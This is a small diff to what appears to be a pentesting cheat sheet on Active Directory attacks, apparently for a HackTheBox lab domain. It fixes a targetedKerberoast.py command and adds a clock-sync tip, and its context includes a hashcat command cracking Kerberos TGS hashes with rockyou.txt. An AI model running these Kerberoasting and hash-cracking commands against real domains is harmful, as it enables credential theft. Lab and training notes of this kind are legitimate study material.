@@ -172,8 +172,14 @@ hashcat -m 13100 file_tgs /usr/share/wordlists/rockyou.txt
 
 
 ```
-./targetedKerberoas.py -d htb.local -u $user -p $password -v
+./targetedKerberoast.py -d htb.local -u $user -p $password -v
+
+# TRoubleshooting:
+# Sometimes it's necessary to sync the attacker machine date with the domain controller. In kali:
+sudo ntpdate -u $DomainControolerip
 ```
+
+
 
 
 ## 👀 Attacking Domain Trusts # 1: Child -> Parent Trusts
